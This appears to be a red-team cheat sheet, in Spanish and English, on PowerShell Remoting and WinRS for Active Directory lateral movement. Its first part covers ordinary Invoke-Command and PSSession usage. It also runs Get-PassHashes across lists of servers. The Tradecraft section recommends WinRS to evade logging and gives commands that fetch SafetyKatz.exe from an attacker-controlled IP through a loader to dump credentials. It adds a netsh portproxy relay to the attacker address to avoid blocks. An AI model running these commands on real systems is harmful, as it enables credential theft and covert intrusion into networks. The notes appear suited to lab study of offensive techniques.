# Powershell Remoting & Tradecraft 

Tags: #AD #Windows #Powershell #Tradecraft #Winrs


```bash 
Piensa en Powershell Remoting (PSRemoting) como 'psexec' con esteroides pero mucho mas silencioso y rapido. PSRemoting usa 'WinRM' el cual es una implementación de Microsoft de WS-Management. Es la manera recomendada para manejar Windows Core Servers. Escucha por el puerto 5985 (HTTP) o 5986 (HTTPS) y esta activado por default en el server 2012. Este proceso remoto corre como un proceso de integridad alto. Esto es, tu tienes una shell elevada.     

1. One-to-one
2. PSSession
	- Interactive
	- Runs in a new process (wsmprovhost)
	- Is Stateful
3. Useful cmdlets
	- New-PSSession
	- Enter-PSSession 
4. One-to-Many
5. Also Known as Fan-out remoting 
6. Non-interactive
7. Executes commands parallely
8. Use cmdlest
	- Invoke-Command 
```

```powershell 
❯ Enter-PSSession hostname     # Iniciar una sesión remota interactiva con el hostname or IP address 
```

## Powershell Remoting 

```powershell 
❯ Invoke-Command -ScriptBlock {$env:computername;$env:username} -ComputerName hostname  # Runs a command or script block 'remotely' on one or more computers via 'PowerShell Remoting and specifies the 'target machine' (replace `hostname` with the actual name or IP).
❯ Invoke-Command -ScriptBlock {$env:computername;$env:username} -ComputerName (cat C:\AD\servers.txt)  # The `Invoke-Command` reads the file (`servers.txt`) locally, then runs the script block remotely on each computer listed.

❯ Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)  # Ejecutar comandos o scriptblocks 
❯ Invoke-Command -FilePath C:\AD\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)  # Ejecutar scripts desde un archivo 

❯ Invoke-Command -ScriptBlock ${funtion:GET-PassHashes} -ComputerName (Get-Content <list_of_servers>) # Ejecutar funciones cargadas localmente en las maquinas remotas 
❯ Invoke-Command -ScriptBlock ${funtion:GET-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList   # Pasar argumentos. Tener en mente que solo argumentos posicionales pueden ser pasados de esta manera  
```

```powershell 
# Ejecutar comandos 'Stateful' usando 'Invoke-Command'
❯ $Sess = New-PSSession -ComputerName server1 
	Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}  
	Invoke-Command -Session $Sess -ScriptBlock {$Proc,Name}
```

## Tradecraft

* [WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)

```powershell 
# Usar WinRS en lugar de PSRemoting para evadir el 'logging' y beneficiarse del puerto 5985
❯ winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname 

❯ winrs -r:hostname cmd 

❯ winrs -r:hostname set computername 

❯ winrs -r:dcorp-mgmt cmd /c "set computername && set username"   # Ejecutar comandos 
```

```powershell 
# Extraer credenciales 
❯ winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://IP/SafetyKatz.exe sekurlsa::evasive-keys exit" 

# La mejor manera para evitar bloqueos 
❯ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_attacker" 
❯ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit" 

Notas:
	1. Se pueden ejecutar los comandos anteriores sin '$null' en caso de que si te lo permita  
```